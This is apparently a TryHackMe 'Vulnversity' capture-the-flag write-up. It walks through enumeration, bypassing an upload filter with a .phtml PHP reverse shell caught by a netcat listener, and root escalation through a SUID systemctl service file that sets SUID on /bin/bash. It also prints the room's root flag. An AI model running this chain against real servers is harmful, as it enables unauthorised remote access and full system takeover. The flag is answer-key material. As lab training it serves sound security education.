# TryHackMe — Vulnversity Writeup

> **Room:** Vulnversity  
> **Difficulty:** Easy  
> **Topics:** Nmap, Gobuster, File Upload Bypass, PHP Reverse Shell, SUID Privilege Escalation  
> **Date:** 2026-06-05

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Directory Enumeration](#2-directory-enumeration)
3. [Compromising the Web Server](#3-compromising-the-web-server)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Flags](#5-flags)
6. [Attack Chain Summary](#6-attack-chain-summary)
7. [Key Concepts](#7-key-concepts)
8. [Lessons Learned](#8-lessons-learned)

---

## 1. Reconnaissance

### Nmap Service Scan

```bash
nmap -sV 10.49.153.77
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | ftp | vsftpd 3.0.5 |
| 22/tcp | open | ssh | OpenSSH 8.2p1 Ubuntu |
| 139/tcp | open | netbios-ssn | Samba smbd 4.6.2 |
| 445/tcp | open | netbios-ssn | Samba smbd 4.6.2 |
| 3128/tcp | open | http-proxy | Squid http proxy 4.10 |
| 3333/tcp | open | http | Apache httpd 2.4.41 |

**Key observations:**
- Web server running on non-standard port `3333`
- FTP, SSH, Samba, and Squid proxy also exposed
- Apache on Ubuntu — likely PHP support

---

## 2. Directory Enumeration

### Gobuster

```bash
gobuster dir -u http://10.49.153.77:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

**Results:**

```
/images    (Status: 301)
/css       (Status: 301)
/js        (Status: 301)
/internal  (Status: 301)  ← target
```

`/internal` is the interesting directory — navigating to it reveals a **file upload form**.

---

## 3. Compromising the Web Server

### Step 1 — Identify the Upload Form

Navigate to:
```
http://10.49.153.77:3333/internal
```

A file upload form is present. The server likely has an extension blocklist — we need to fuzz it.

---

### Step 2 — Fuzz Upload Extensions with Burp Suite Intruder

**Goal:** Find which PHP extension bypasses the blocklist.

Create `extensions.txt`:
```
.php
.php3
.php4
.php5
.phtml
```

**Capture the request:**
- Enable Burp proxy at `127.0.0.1:8080`
- Upload any dummy file
- Intercept in Burp → right-click → **Send to Intruder**

**Configure Intruder:**
- Attack type: **Sniper**
- In **Positions** tab, mark the extension as payload position:
  ```
  filename="test§.php§"
  ```
- In **Payloads** tab, load `extensions.txt`
- Click **Start Attack**

**Result:** `.phtml` returns a different response → not blocked ✅

---

### Step 3 — Prepare the Reverse Shell

Download: [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Get your tun0 IP:
```bash
ip addr show tun0 | grep inet
```

Edit these two lines in the file:
```php
$ip = '10.11.5.42';  // replace with your tun0 IP
$port = 1234;
```

Rename to bypass the filter:
```bash
mv php-reverse-shell.php php-reverse-shell.phtml
```

---

### Step 4 — Start Netcat Listener

```bash
nc -lvnp 1234
```

---

### Step 5 — Upload and Trigger

1. Upload `php-reverse-shell.phtml` via the upload form
2. Trigger execution by navigating to:
```
http://10.49.153.77:3333/internal/uploads/php-reverse-shell.phtml
```
3. Check your netcat listener — connection received:

```
listening on [any] 1234 ...
connect to [10.11.5.42] from (UNKNOWN) [10.49.153.77] 54321
Linux ubuntu ...
$
```

---

### Step 6 — Stabilize the Shell

Raw netcat shells are unstable. Run these in order:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Press `Ctrl+Z`, then:

```bash
stty raw -echo; fg
```

Then:

```bash
export TERM=xterm
```

You now have a fully interactive shell with tab completion and arrow keys.

---

## 4. Privilege Escalation

### Step 1 — Find SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

Reviewing the output, `/bin/systemctl` immediately stands out — it has SUID set but has no legitimate reason to. Every other binary (`passwd`, `sudo`, `mount`, `su`) has a documented need for SUID. `systemctl` does not.

---

### Step 2 — Verify on GTFOBins

Reference: https://gtfobins.github.io/gtfobins/systemctl/#suid

`systemctl` is confirmed exploitable via SUID — the `ExecStart` in a service file runs as root.

---

### Step 3 — Create the Malicious Service File

> **Note:** Use `printf` instead of `echo` — a raw `/bin/sh` shell doesn't handle multiline `echo` heredocs. Each line gets interpreted as a separate command, causing errors like `/bin/sh: +s: not found`.

```bash
printf '[Service]\nType=oneshot\nExecStart=/bin/chmod +s /bin/bash\n[Install]\nWantedBy=multi-user.target' > /tmp/privesc.service
```

This creates a service that sets the SUID bit on `/bin/bash` — meaning bash will run as root for anyone.

---

### Step 4 — Link and Enable the Service

```bash
/bin/systemctl link /tmp/privesc.service
```

```bash
/bin/systemctl enable --now /tmp/privesc.service
```

Expected output:
```
Created symlink /etc/systemd/system/privesc.service → /tmp/privesc.service
Created symlink /etc/systemd/system/multi-user.target.wants/privesc.service → /tmp/privesc.service
```

Since `systemctl` has SUID, it runs as root. `ExecStart` (`chmod +s /bin/bash`) executes as root.

---

### Step 5 — Spawn Root Shell

```bash
/bin/bash -p
```

The `-p` flag preserves the elevated EUID — without it, bash drops root privileges on startup.

**Verify:**
```bash
id
```

```
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

`euid=0(root)` ✅ — operating as root.

---

## 5. Flags

```bash
# User flag
cat /home/bill/user.txt

# Root flag
cat /root/root.txt
# a58ff8579f0a9270368d33a9966c7fd5
```

---

## 6. Attack Chain Summary

```
nmap -sV → port 3333 Apache found
        ↓
gobuster → /internal directory found
        ↓
File upload form identified
        ↓
Burp Intruder → fuzz extensions → .phtml bypasses filter
        ↓
php-reverse-shell.phtml prepared (tun0 IP set)
        ↓
nc -lvnp 1234 started
        ↓
Shell uploaded → triggered via URL
        ↓
www-data shell received ✅
        ↓
python3 pty + stty raw -echo → shell stabilized
        ↓
find / -perm -u=s → /bin/systemctl found (abnormal SUID)
        ↓
printf service file → ExecStart=/bin/chmod +s /bin/bash
        ↓
systemctl link + enable → runs as root → bash gets SUID
        ↓
/bin/bash -p → euid=0(root) ✅
        ↓
cat /root/root.txt → flag captured 🏁
```

---

## 7. Key Concepts

| Term | Meaning |
|------|---------|
| SUID | Binary runs with file owner's permissions (usually root) instead of the caller's |
| `euid` | Effective User ID — what the OS actually uses for permission checks |
| `-p` flag | Tells bash to preserve elevated EUID on startup, not drop it |
| `systemctl link` | Registers a service file from any path into systemd |
| `systemctl enable --now` | Enables AND immediately starts the service |
| Extension Fuzzing | Testing many file extensions to find one not blocked by the server |
| Reverse Shell | Target machine connects back to attacker — bypasses inbound firewall rules |
| TTY Stabilization | Converts raw netcat shell into a fully interactive terminal |
| `.phtml` | Valid PHP extension often missed by basic extension blocklists |
| GTFOBins | Reference database for exploiting misconfigurations in standard Unix binaries |

---

## 8. Lessons Learned

**Why GTFOBins SUID Editor method failed:**
- Modern systemd drops SUID privileges before spawning the editor
- `SYSTEMD_EDITOR=/tmp/shell systemctl edit basic.target` ran as `www-data`, not root
- GTFOBins entry works on older systemd versions only

**Why the service file method worked:**
- `ExecStart` runs as a systemd service — privileges are not dropped here
- The privilege drop only applies to interactive editor spawning

**Why `printf` instead of `echo`:**
- Raw `/bin/sh` interprets each line of a multiline `echo` as a separate command
- `Type=oneshot` → shell tries to run `Type=oneshot` as a binary
- `ExecStart=/bin/chmod +s /bin/bash` → shell tries to run `+s` as a command → error
- `printf '\n'` sends the entire string as one command with embedded newlines

**SUID vs SUDO — quick distinction:**

| | SUID | SUDO |
|--|------|------|
| Found via | `find / -perm -u=s` | `sudo -l` |
| Visible in | File permissions (`-rws`) | `/etc/sudoers` |
| Trigger | Run binary directly | Prefix with `sudo` |
| GTFOBins tab | SUID | Sudo |